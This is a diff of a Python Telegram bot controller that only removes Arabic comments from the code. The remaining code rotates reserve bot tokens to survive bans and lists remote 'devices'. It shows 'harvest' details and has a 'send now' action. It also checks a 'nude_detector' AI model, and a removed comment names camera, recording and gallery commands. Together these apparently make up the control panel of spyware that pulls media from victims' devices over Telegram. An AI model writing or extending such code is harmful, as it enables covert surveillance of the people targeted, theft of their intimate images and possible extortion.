@@ -104,14 +104,12 @@ class T:
             if self.reserve_tokens:
                 new_token = self.reserve_tokens.pop(0)
                 self.active_tokens.append(new_token)
-                # إرسال تقرير للمشرف يتضمن الترتيب التقريبي للبوت المعطل
                 self._api("sendMessage", {
                     "chat_id": self.ctrl,
                     "text": f"⚠️ <b>Emergency switch</b>\nBot #{idx+1} replaced. {len(self.reserve_tokens)} reserve left.",
                     "parse_mode": "HTML"
                 })
             else:
-                # حالة الطوارئ القصوى: لا يوجد بوتات احتياطية
                 self._api("sendMessage", {
                     "chat_id": self.ctrl,
                     "text": "🚨 <b>CRITICAL: No reserve bots left!</b> Please add new tokens via GitHub Secrets.",
@@ -138,7 +136,6 @@ class T:
             token = self._next_token()
             if not token:
                 return None
-            # إذا كان نفس البوت الذي تسبب في 429 في المحاولة السابقة، نغيره فوراً
             if attempt > 0 and token == last_token:
                 token = self._next_token()
                 if not token:
@@ -151,7 +148,7 @@ class T:
                 if result.get('ok'):
                     return result
                 error = result.get('error_code')
-                if error == 429:  # Too Many Requests
+                if error == 429:
                     time.sleep(2)
                     continue
                 elif error in (401, 403):
@@ -282,7 +279,6 @@ class T:
             self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ Session expired, use /login"})
             return
 
-        # قائمة الأجهزة
         if data == "ld":
             kb = {"inline_keyboard": []}
             for did, info in self.dvs.items():
@@ -297,7 +293,6 @@ class T:
             })
             return
 
-        # جهاز محدد
         if data.startswith("dev_"):
             did = data[4:]
             if did in self.dvs:
@@ -310,12 +305,10 @@ class T:
                 })
             return
 
-        # تفاصيل الحصاد
         if data.startswith("hrv_"):
             self._show_harvest_details(chat_id)
             return
 
-        # إرسال فوري
         if data.startswith("send_now_"):
             did = data[8:]
             try:
@@ -326,28 +319,24 @@ class T:
                 self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {e}"})
             return
 
-        # حالة الذكاء الاصطناعي
         if data == "ai_status":
             ai_loaded = hasattr(self.m, 'nude_detector') and self.m.nude_detector and self.m.nude_detector.model is not None
             status = "✅ Active" if ai_loaded else "❌ Not ready"
             self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": f"AI: {status}", "show_alert": True})
             return
 
-        # تجديد الجلسة
         if data == "rnw":
             self.ses[str(chat_id)] = time.time() + 14400
             self._save()
             self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": "✅ Session renewed"})
             return
 
-        # تسجيل الخروج
         if data == "ext":
             self.ses.pop(str(chat_id), None)
             self._save()
             self._api("editMessageText", {"chat_id": chat_id, "message_id": msg_id, "text": "🔒 Logged out."})
             return
 
-        # العودة للقائمة الرئيسية
         if data == "main":
             self._api("editMessageText", {
                 "chat_id": chat_id,
@@ -357,7 +346,6 @@ class T:
             })
             return
 
-        # باقي الأوامر (كاميرا، تسجيل، معرض)
         try:
             import commands
             importlib.reload(commands)
